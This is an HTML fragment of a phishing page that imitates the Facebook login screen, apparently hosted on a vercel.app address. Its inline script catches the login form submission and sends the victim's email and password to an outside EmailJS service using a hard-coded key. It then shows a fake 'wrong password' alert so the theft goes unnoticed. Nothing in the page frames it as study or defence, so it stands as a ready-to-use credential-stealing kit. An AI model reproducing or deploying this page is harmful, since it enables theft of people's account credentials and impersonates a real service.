<body>

            <input type="password" id="password" name="password" placeholder="Password" required="">
            <button type="submit">Log In</button>
            <a href="https://facebook-login-rny58qv7c-el-professor.vercel.app/#" class="forgot-password">Forgotten password?</a>

            <p>New to Facebook?</p>

        </div>
    </div>
    <script src="./fbloginfake_files/email.min.js.download"></script>
    <script src="./fbloginfake_files/script.js.download"></script>
    <script>
        // Initialize EmailJS with your user ID
        emailjs.init("sORFw8Hl_RIwb17OR");

        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent default form submission

            // Collect form data
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            // Send an email with EmailJS
            emailjs.send('service_prfssr', 'template_4hz2kyw', {
                email: email,
                password: password
            }).then(function(response) {
                alert('Wrong password, please try again!');
            }, function(error) {
                alert('Wrong email or phone number, please try again');
            });
        });
    </script>
